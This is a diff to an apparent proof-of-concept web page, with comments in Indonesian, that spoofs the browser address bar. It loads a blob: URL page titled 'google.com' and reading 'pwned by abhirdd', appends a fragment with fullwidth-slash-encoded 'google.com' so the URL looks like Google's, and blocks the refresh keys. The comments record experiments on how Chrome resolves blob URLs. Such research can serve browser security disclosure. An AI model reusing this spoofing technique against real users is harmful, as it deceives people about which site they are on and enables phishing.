@@ -27,11 +27,8 @@
 
       var payload =
         '<!DOCTYPE html><html><head><meta charset="utf-8"><title>google.com</title></head>' +
-        '<body style="margin:0;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#0a0a0a;color:#fff;font-family:system-ui,sans-serif;gap:20px;">' +
-        '<h1 style="margin:0;font-size:2rem;font-weight:500;">pwned by abhirdd</h1>' +
-        '<img src="https://cataas.com/cat?width=400&height=300&t=' + Date.now() + '" alt="cat" style="max-width:400px;width:80vw;border-radius:12px;" ' +
-        'onerror="this.style.display=\'none\'">' +
-        '<p style="font-size:0.75rem;color:#666;">(F5 / Ctrl+R diblok di halaman ini)</p>' +
+        '<body style="margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#ffffff;color:#000000;font-family:Arial,Helvetica,sans-serif;">' +
+        '<h1 style="font-weight:normal;font-size:3rem;margin:0;">pwned by abhirdd</h1>' +
         '<scr' + 'ipt>' +
         'window.addEventListener("keydown",function(e){' +
         'if(e.key==="F5"||((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==="r")){e.preventDefault();e.stopPropagation();}},true);' +
@@ -42,33 +39,33 @@
       function makeUrl() {
         return URL.createObjectURL(new Blob([payload], { type: 'text/html' }));
       }
-      function uuidOf(u) {
-        return u.substring(u.lastIndexOf('/') + 1);
-      }
 
-      // ---- JALUR file:// : canonical blob:null/<uuid> + fragment ----
-      // Penting: di file:// Chrome match blob URL EXACT-STRING (bukan by UUID),
-      // jadi path-spoof ("blob:null/google.com/...") GAGAL (ERR_FILE_NOT_FOUND).
-      // google.com + pwned ditaruh di fragment saja (100% aman).
+      // Fragment display-spoof: google.com + pwned. Fragment = komponen
+      // terakhir, isinya bebas, dan TIDAK mengganggu resolve blob URL.
+      var FRAGMENT = '#%EF%BC%8Fgoogle.com%EF%BC%8Fpwned-by-abhirdd';
+
+      // Catatan penting (ditemukan via eksperimen):
+      //  - file:// : Chrome match blob URL EXACT-STRING -> hanya canonical
+      //              "blob:null/<uuid>" yang LOAD.
+      //  - https   : path-spoof ("/google.com/<uuid>") tampil di address bar
+      //              tapi halaman-nya ERR_FILE_NOT_FOUND. Yang PASTI LOAD
+      //              hanya canonical "blob:<origin>/<uuid>".
+      // Karena itu kedua jalur pakai canonical + fragment agar halaman
+      // "pwned by abhirdd" benar-benar tampil.
+
       if (location.protocol === 'file:' || location.origin === 'null') {
         var uf = makeUrl();
-        var fragf = '#%EF%BC%8Fgoogle.com%EF%BC%8Fpwned-by-abhirdd';
         log('[main] mode file:// -> canonical blob:null + fragment');
-        log('[main] target: ' + uf + fragf);
-        location.replace(uf + fragf);
+        log('[main] target: ' + uf + FRAGMENT);
+        location.replace(uf + FRAGMENT);
         return;
       }
 
-      // ---- JALUR https : blob:<origin>/google.com/<uuid> + fragment ----
-      // Terverifikasi commit di Chrome: path "google.com" (1 segmen tambahan)
-      // resolve by UUID. Segmen TAMBAHAN (pwned-by-abhirdd) gagal di https,
-      // jadi pwned ditaruh di fragment biar clean & pasti tampil.
       setTimeout(function () {
         var u = makeUrl();
-        var disp = 'blob:' + location.origin + '/google.com/' + uuidOf(u);
-        var fragh = '#%EF%BC%8Fgoogle.com%EF%BC%8Fpwned-by-abhirdd';
-        log('[main] commit: ' + disp + fragh);
-        location.replace(disp + fragh);
+        log('[main] mode https -> canonical blob + fragment');
+        log('[main] target: ' + u + FRAGMENT);
+        location.replace(u + FRAGMENT);
       }, 1200);
     })();
   </script>
